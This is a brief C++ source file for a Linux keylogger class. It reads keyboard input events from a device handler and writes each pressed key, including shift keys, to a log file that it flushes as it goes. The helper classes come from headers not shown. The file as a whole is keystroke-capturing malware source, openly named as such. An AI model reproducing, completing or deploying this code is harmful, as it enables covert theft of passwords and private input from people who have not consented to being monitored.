#include"keylogger.h"
#include<iostream>


Keylogger::Keylogger(std::string output): logfile(output){
Parser p;
std::string handler = p.get_handler();
kbd = new Keyboard(handler);
}

void Keylogger::log_keys(){

if(kbd->get_ev().type == EV_KEY)
	if((kbd->get_key_state() == "PRESSED")||( kbd->get_ev().code == 54 )||(kbd->get_ev().code == 42)){
		logfile<<kbd->code_key_map();
		logfile.flush();
	}
kbd->set_ev();

}


Keylogger::~Keylogger(){
delete kbd;
logfile.flush();
logfile.close();


}
